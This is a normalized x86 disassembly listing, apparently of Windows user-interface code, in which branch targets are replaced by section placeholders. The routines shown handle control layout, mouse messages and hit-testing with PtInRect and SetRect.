mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4342a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
mov esi ecx
call sub_40e4c0
mov [ esi + 0x98 ] edi
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0xc ]
lea eax [ ebp + 0x8 ]
mov [ ebp + 0xc ] 0x0
call sub_414260
mov eax [ ebp + 0x8 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi [ eax + 0x10 ]
test edi edi
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0x94 ] eax
sub_434310
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x54 ]
lea edi [ esi - 0x70 ]
push edi
push 0x2a3
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x20
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x200
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x201
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x202
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x20a
call sub_412fd0
pop edi
pop esi
retn
sub_434370
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x8 ]
sub esp 0x30
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi + 0x40 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x44 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x48 ] ecx
mov edx [ eax + 0xc ]
mov [ esi + 0x4c ] edx
mov ecx [ eax ]
mov [ esi + 0x30 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x38 ] ecx
mov edx [ eax + 0xc ]
mov [ esi + 0x3c ] edx
mov ecx [ eax ]
mov [ esi + 0x50 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x54 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x58 ] ecx
mov edx [ eax + 0xc ]
mov eax [ esi + 0x98 ]
mov [ esi + 0x5c ] edx
mov eax [ eax + 0x100 ]
push edi
xor edi edi
cmp [ eax - 0xc ] edi
jne r-xdata
push eax
mov eax [ rw-data ]
push eax
lea ecx [ esp + 0x10 ]
call sub_428d70
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov eax [ esi + 0x38 ]
mov [ esi + 0x74 ] ecx
mov ecx [ esi + 0x3c ]
mov [ esi + 0x78 ] edx
mov edx [ esp + 0x8 ]
mov [ esi + 0x7c ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x80 ] ecx
add [ esi + 0x74 ] edx
add [ esi + 0x78 ] eax
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
sub [ esi + 0x7c ] ecx
sub [ esi + 0x80 ] edx
lea eax [ esp + 0x8 ]
push eax
mov eax [ esi + 0x98 ]
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x2c ]
mov [ esp + 0xc ] edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x24 ] edi
call sub_413b10
mov ecx [ esi + 0x74 ]
mov edx [ esi + 0x78 ]
mov eax [ esi + 0x7c ]
mov [ esi + 0x84 ] ecx
mov ecx [ esi + 0x80 ]
mov [ esi + 0x88 ] edx
mov edx [ esp + 0x10 ]
sub edx [ esp + 0x8 ]
mov [ esi + 0x8c ] eax
mov eax [ esp + 0x18 ]
sub eax [ esp + 0x20 ]
mov [ esi + 0x90 ] ecx
add [ esi + 0x84 ] edx
add [ esi + 0x8c ] eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov eax [ esi + 0x38 ]
mov [ esi + 0x74 ] ecx
mov ecx [ esi + 0x3c ]
mov [ esi + 0x78 ] edx
mov edx [ esi + 0x30 ]
mov [ esi + 0x7c ] eax
mov eax [ esi + 0x34 ]
mov [ esi + 0x84 ] edx
mov edx [ esi + 0x3c ]
mov [ esi + 0x80 ] ecx
mov ecx [ esi + 0x38 ]
mov [ esi + 0x88 ] eax
mov [ esi + 0x8c ] ecx
mov [ esi + 0x90 ] edx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4344e0
push ebp
mov ebp esp
cmp [ ecx + 0x24 ] 0x0
je r-xdata
pop ebp
retn 0xc
cmp [ ecx + 0x25 ] 0x0
je r-xdata
cmp [ ecx + 0x26 ] 0x0
je r-xdata
mov eax [ ecx + 0xb8 ]
sub eax [ ecx + 0xb0 ]
je r-xdata
mov edx [ ecx + 0x98 ]
cmp [ edx + 0xfc ] 0x1
jne r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x90 ]
push eax
call edx
mov eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x94 ]
push edx
call eax
pop ebp
retn 0xc
sub_434540
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x98 ]
push edi
call edx
mov eax [ esi ]
mov edx [ eax + 0x9c ]
push edi
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0xa0 ]
push edi
mov ecx esi
call edx
pop edi
pop esi
pop ebp
retn 0x4
sub_434580
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x74
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
mov [ esp + 0x14 ] eax
lea ecx [ esi + 0xb0 ]
lea ebx [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
call sub_414260
mov eax [ esp + 0x18 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov ecx [ esp + 0x7c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov esi [ eax + 0x10 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov ecx [ edi + 0x74 ]
mov eax [ edi + 0x7c ]
mov edx [ edi + 0x78 ]
mov [ esp + 0x3c ] ecx
mov ecx [ edi + 0x80 ]
mov [ esp + 0x44 ] eax
mov eax [ edi + 0x98 ]
mov [ esp + 0x40 ] edx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
mov dl [ eax + 0xa9 ]
mov [ esp + 0x10 ] dl
cmp [ eax + 0xf8 ] bl
jne r-xdata
lea eax [ esp + 0x2c ]
push eax
mov eax [ edi + 0x98 ]
lea ecx [ esp + 0x50 ]
lea edx [ esp + 0x60 ]
call sub_413b10
mov edx [ edi + 0x7c ]
mov eax [ edi + 0x74 ]
mov ecx [ edi + 0x78 ]
mov ebx [ esp + 0x14 ]
mov [ esp + 0x24 ] edx
mov edx [ edi + 0x80 ]
mov edi [ esp + 0x10 ]
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x34 ]
sub edx [ esp + 0x2c ]
mov [ esp + 0x1c ] eax
add edx eax
mov eax [ esp + 0x38 ]
sub eax [ esp + 0x30 ]
push edi
add eax ecx
mov [ esp + 0x2c ] eax
mov [ esp + 0x24 ] ecx
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x2c ] edx
mov edx [ esi ]
mov edx [ edx + 0x14 ]
lea ecx [ esp + 0x24 ]
push ecx
push ebx
mov ecx esi
call edx
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x48 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x44 ]
mov [ esp + 0x24 ] eax
sub eax [ esp + 0x54 ]
mov [ esp + 0x28 ] edx
add eax [ esp + 0x4c ]
push edi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x3c ]
sub eax [ esp + 0x34 ]
mov [ esp + 0x24 ] ecx
add eax ecx
mov [ esp + 0x2c ] eax
mov edx [ esi ]
mov edx [ edx + 0x14 ]
lea eax [ esp + 0x50 ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
push ebx
mov ecx esi
call edx
mov eax [ esp + 0x3c ]
mov edx [ esp + 0x44 ]
mov ecx [ esp + 0x40 ]
mov [ esp + 0x1c ] eax
sub eax [ esp + 0x2c ]
mov [ esp + 0x24 ] edx
add eax [ esp + 0x34 ]
mov edx [ esp + 0x48 ]
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x38 ]
sub edx [ esp + 0x30 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x4c ]
sub eax [ esp + 0x54 ]
mov [ esp + 0x20 ] ecx
add [ esp + 0x24 ] eax
add edx ecx
push edi
lea ecx [ esp + 0x60 ]
mov [ esp + 0x2c ] edx
mov eax [ esi ]
push ecx
mov eax [ eax + 0x18 ]
lea edx [ esp + 0x24 ]
push edx
push ebx
mov ecx esi
call eax
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x14 ]
mov [ esp + 0x74 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x78 ] ecx
push eax
lea ecx [ esp + 0x70 ]
push ecx
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x44 ]
push eax
push ecx
mov ecx esi
mov [ esp + 0x7c ] ebx
mov [ esp + 0x80 ] ebx
call edx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x70 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
sub_4347e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x6c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0xbc ]
mov [ esp + 0x20 ] eax
mov eax [ esi + 0xb8 ]
sub eax [ esi + 0xb0 ]
push edi
sbb ecx [ esi + 0xb4 ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] ecx
js r-xdata
mov ecx [ esp + 0x74 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
jg r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
call sub_414260
mov eax [ esp + 0x10 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
test eax eax
je r-xdata
mov ebx [ eax + 0x10 ]
xor eax eax
cmp ebx eax
je r-xdata
mov ecx [ esi + 0x98 ]
cmp [ ecx + 0xf8 ] al
je r-xdata
mov edx [ esi + 0xa8 ]
or edx [ esi + 0xac ]
je r-xdata
mov edi [ esi + 0x94 ]
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] eax
mov eax ecx
mov cl [ eax + 0xa9 ]
lea edx [ esp + 0x10 ]
mov [ esp + 0xc ] cl
push edx
lea ecx [ esp + 0x48 ]
lea edx [ esp + 0x38 ]
call sub_413b10
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
sub ecx eax
lea edx [ eax + edi ]
lea eax [ ecx + edx ]
mov [ esp + 0x64 ] edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x6c ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x68 ] edx
mov edx [ esi + 0x74 ]
mov [ esp + 0x70 ] eax
mov eax [ esi + 0x78 ]
mov [ esp + 0x54 ] edx
add ecx [ esp + 0x54 ]
mov edx [ esi + 0x7c ]
mov [ esp + 0x58 ] eax
sub eax [ esp + 0x14 ]
mov [ esp + 0x5c ] edx
mov edx [ esi + 0x80 ]
add eax [ esp + 0x1c ]
mov [ esp + 0x5c ] ecx
mov ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x64 ] edx
lea edx [ esp + 0x68 ]
push edx
mov edx [ esp + 0x2c ]
mov [ esp + 0x68 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x14 ]
lea ecx [ esp + 0x5c ]
push ecx
push edx
mov ecx ebx
call eax
mov eax [ esi + 0x8c ]
mov ecx [ esi + 0xac ]
sub eax [ esi + 0x84 ]
push ecx
mov ecx [ esi + 0xa8 ]
cdq
push ecx
push edx
push eax
call sub_444a60
mov ecx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x2c ]
push ecx
push edx
push eax
call sub_444ad0
mov ecx [ esi + 0x84 ]
mov [ esp + 0x14 ] edx
mov edx [ esi + 0x88 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x8c ]
mov [ esp + 0x58 ] edx
mov edx [ esi + 0x90 ]
mov [ esp + 0x5c ] eax
sub eax ecx
mov [ esp + 0x60 ] edx
cdq
mov [ esp + 0x54 ] ecx
mov [ esp + 0x28 ] eax
cmp [ esp + 0x14 ] edx
jg r-xdata
mov eax [ esp + 0x40 ]
sub eax [ esp + 0x38 ]
mov edx [ esp + 0x3c ]
add eax [ esp + 0x58 ]
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x34 ]
lea ecx [ eax + edi ]
sub edx eax
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
add edx ecx
mov [ esp + 0x64 ] ecx
mov ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x70 ] edx
lea edx [ esp + 0x68 ]
push edx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x5c ]
push ecx
push edx
mov ecx ebx
call eax
mov ecx [ esi + 0xa8 ]
cmp ecx [ esi + 0xb8 ]
jne r-xdata
jl r-xdata
mov edx [ esi + 0xac ]
cmp edx [ esi + 0xbc ]
jne r-xdata
mov edx [ esp + 0x10 ]
add edx ecx
mov [ esp + 0x5c ] edx
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x28 ]
jae r-xdata
mov eax [ esi + 0x74 ]
mov ecx [ esi + 0x7c ]
mov edx [ esi + 0x78 ]
mov [ esp + 0x54 ] eax
mov eax [ esi + 0x80 ]
mov [ esp + 0x5c ] ecx
mov ecx [ esp + 0x44 ]
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x4c ]
mov esi ecx
sub esi eax
add esi [ esp + 0x5c ]
sub eax ecx
add edi ecx
add eax edi
mov [ esp + 0x54 ] esi
mov esi [ esp + 0x50 ]
sub esi [ esp + 0x48 ]
mov [ esp + 0x6c ] eax
mov eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x68 ]
push ecx
mov ecx [ esp + 0x2c ]
add esi edx
lea eax [ esp + 0x5c ]
mov [ esp + 0x60 ] edx
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push eax
push ecx
mov ecx ebx
mov [ esp + 0x70 ] esi
mov [ esp + 0x74 ] edi
call edx
sub_434af0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
cmp [ esi + 0xc0 ] 0x0
push edi
mov [ esp + 0x14 ] eax
jne r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
mov [ esp + 0xc ] 0x1
call sub_414260
mov eax [ esp + 0x10 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov eax [ esi + 0x98 ]
cmp [ eax + 0xf9 ] 0x0
je r-xdata
mov ecx [ esp + 0x4c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ebx [ eax + 0x10 ]
xor eax eax
cmp ebx eax
je r-xdata
cmp [ esi + 0x27 ] 0x0
je r-xdata
cmp [ esi + 0x27 ] 0x0
jne r-xdata
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax 0x55555556
imul [ ebx + 0xc ]
mov edi edx
shr edi 0x1f
add edi edx
cmp [ esi + 0xc0 ] 0x0
mov [ esp + 0x28 ] edi
mov [ esp + 0xc ] 0x0
je r-xdata
cmp [ esi + 0xc1 ] 0x0
je r-xdata
cmp [ eax + 0xfa ] 0x0
jne r-xdata
cmp [ esi + 0xc1 ] 0x0
je r-xdata
lea eax [ edi + edi ]
mov [ esp + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
lea ecx [ eax + edi ]
push ecx
push 0x0
push eax
lea edx [ esp + 0x4c ]
push edx
call [ SetRect@IAT ]
mov eax [ esi + 0x30 ]
mov edx [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x34 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x24 ] edx
mov eax [ esp + 0x24 ]
mov edx [ esi + 0x8c ]
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] edx
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x20 ] ecx
mov ecx [ esi + 0x84 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x8c ]
sub eax ecx
mov [ esp + 0x2c ] ecx
mov ecx [ esi + 0xac ]
push ecx
mov ecx [ esi + 0xa8 ]
cdq
push ecx
push edx
push eax
call sub_444a60
mov ecx [ esi + 0xb8 ]
sub ecx [ esi + 0xb0 ]
mov edi [ esi + 0xbc ]
sbb edi [ esi + 0xb4 ]
push edi
push ecx
push edx
push eax
call sub_444ad0
mov edx [ esp + 0x10 ]
mov ecx [ esi + 0xdc ]
sub eax edx
add eax [ esi + 0x84 ]
mov [ esp + 0x2c ] eax
test ecx ecx
jne r-xdata
mov [ esp + 0xc ] edi
sub ecx edx
mov eax ecx
mov [ esp + 0x2c ] eax
cmp [ esi + 0xe0 ] ecx
je r-xdata
mov edx [ esp + 0x28 ]
lea ecx [ eax + edx ]
mov eax [ esi + 0x38 ]
mov [ esp + 0x34 ] ecx
cmp ecx eax
jle r-xdata
mov eax ecx
mov [ esp + 0x2c ] eax
mov ecx [ esi + 0x30 ]
cmp eax ecx
jge r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ esp + 0x24 ]
mov edi [ esp + 0x1c ]
sub eax edi
cmp [ ebx + 0x10 ] eax
jge r-xdata
mov [ esp + 0x34 ] eax
sub eax edx
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x38 ]
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ esp + 0x24 ]
sub eax [ ebx + 0x10 ]
mov ecx [ esp + 0x30 ]
sub eax edi
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
mov [ esp + 0x30 ] ecx
add eax ecx
mov [ esp + 0x38 ] eax
jmp r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x30 ]
mov [ esi + 0xc8 ] ecx
mov ecx [ esp + 0x34 ]
mov [ esi + 0xcc ] edx
mov [ esi + 0xd0 ] ecx
mov [ esi + 0xd4 ] eax
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push 0x1
lea eax [ esp + 0x40 ]
push eax
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x34 ]
push ecx
push eax
mov ecx ebx
call edx
sub_434d90
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
mov eax [ esi - 0x70 ]
mov edx [ eax + 0x78 ]
push edi
lea edi [ esi - 0x70 ]
mov ecx edi
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0xc ]
cmp eax 0x2a3
jne r-xdata
cmp eax 0x20
jne r-xdata
cmp [ esi + 0x50 ] 0x0
mov [ esi + 0x68 ] 0x0
jne r-xdata
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ edi ]
mov edx [ edx + 0x7c ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx edi
call edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ esi + 0x51 ] 0x0
je r-xdata
cmp [ esi - 0x54 ] 0x0
je r-xdata
cmp eax 0x201
je r-xdata
mov eax edi
mov [ esi + 0x51 ] 0x0
call sub_426dd0
mov ecx [ esi - 0x54 ]
mov edx [ ecx ]
lea eax [ esi - 0x70 ]
neg eax
sbb eax eax
and eax esi
push eax
mov eax [ edx + 0x64 ]
call eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ esi - 0x49 ] 0x0
jne r-xdata
cmp eax 0x202
jne r-xdata
mov eax [ ebp + 0x14 ]
movsx ebx ax
shr eax 0x10
cwde
push eax
mov [ esp + 0x18 ] eax
push ebx
lea eax [ esi - 0x40 ]
push eax
call [ PtInRect@IAT ]
mov ecx [ ebp + 0xc ]
sub ecx 0x200
je r-xdata
cmp eax 0x200
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
dec ecx
je r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ edi ]
push eax
mov [ esi + 0x70 ] eax
mov eax [ edx + 0xa4 ]
push ebx
mov ecx edi
mov [ esi + 0x6c ] ebx
call eax
test eax eax
je r-xdata
test eax eax
je r-xdata
dec ecx
jne r-xdata
cmp [ esi + 0x51 ] 0x0
mov [ esi + 0x68 ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esi + 0x58 ]
push ecx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x1
jmp r-xdata
cmp [ esi + 0x52 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ esi + 0x50 ] cl
je r-xdata
mov [ esi - 0x4 ] 0x0
mov eax edi
mov [ esi + 0x51 ] 0x0
call sub_426dd0
mov [ esi + 0x68 ] 0x0
cmp [ esi + 0x68 ] 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
mov edx [ edi ]
mov edx [ edx + 0x88 ]
push eax
mov ecx edi
push ebx
call edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ edi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi - 0x54 ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
mov eax [ esi - 0x6c ]
mov eax [ eax + 0x4 ]
push eax
push 0x114
push edi
call edx
mov ecx [ esi - 0x54 ]
mov edx [ ecx ]
lea eax [ esi - 0x70 ]
neg eax
sbb eax eax
and eax esi
push eax
mov eax [ edx + 0x60 ]
call eax
cmp [ esi + 0x69 ] 0x0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x50 ] 0x1
je r-xdata
mov ecx [ esi - 0x54 ]
mov edx [ ecx ]
lea eax [ esi - 0x70 ]
neg eax
sbb eax eax
and eax esi
push eax
mov eax [ edx + 0x64 ]
call eax
cmp [ esi + 0x69 ] 0x0
mov ecx [ esp + 0x14 ]
mov [ esi + 0x6a ] 0x0
mov [ esi + 0x50 ] 0x0
mov [ esi + 0x6c ] ebx
mov [ esi + 0x70 ] ecx
je r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x1
mov eax edi
mov [ esi + 0x51 ] 0x1
call sub_426dd0
cmp [ esi + 0x51 ] 0x0
jne r-xdata
mov [ esi + 0x68 ] 0x1
cmp [ edi + 0x1c ] 0x0
je r-xdata
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x3c ]
push edi
call edx
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x6c ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ edi ]
push eax
mov [ esi + 0x70 ] eax
mov eax [ edx + 0xa4 ]
push ebx
mov ecx edi
mov [ esi + 0x6c ] ebx
call eax
mov eax [ esp + 0x14 ]
mov edx [ edi ]
mov edx [ edx + 0x80 ]
push eax
mov ecx edi
push ebx
call edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax edi
call sub_426dd0
mov eax [ esi + 0x30 ]
mov ecx [ esi - 0x54 ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
mov eax [ esi - 0x6c ]
mov eax [ eax + 0x4 ]
push eax
push 0x114
push edi
call edx
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x1
mov eax [ esp + 0x14 ]
mov edx [ edi ]
mov edx [ edx + 0x84 ]
push eax
push ebx
mov ecx edi
call edx
cmp [ edi + 0x1c ] 0x0
je r-xdata
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
push edi
call eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx + 0x6c ]
cmp [ edx - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x38 ]
push 0x1
push eax
mov eax [ ebp + 0x10 ]
push eax
push 0x200
call edx
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x3c ]
push edi
call edx
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x6c ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x38 ]
push 0x1
push edx
mov edx [ ebp + 0x10 ]
push edx
push 0x200
call eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x38 ]
push 0x1
push eax
mov eax [ ebp + 0x10 ]
push eax
push 0x202
call edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_435100
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea edx [ esi + 0x30 ]
push edx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x8
or [ esi + 0x6c ] 0x2
sub_435130
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi + 0xdc ] 0x0
mov [ esi + 0xe0 ] 0x0
cmp [ esi + 0xc0 ] 0x0
jne r-xdata
call sub_435430
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov eax ecx
cdq
cmp eax [ esi + 0xa0 ]
jne r-xdata
mov [ esi + 0xa0 ] eax
mov [ esi + 0xa4 ] edx
cmp edx [ esi + 0xbc ]
jl r-xdata
cmp edx [ esi + 0xa4 ]
je r-xdata
cmp edx [ esi + 0xb4 ]
jg r-xdata
jg r-xdata
cmp [ esi + 0xc4 ] 0x0
jne r-xdata
jl r-xdata
mov ecx [ esi + 0xb8 ]
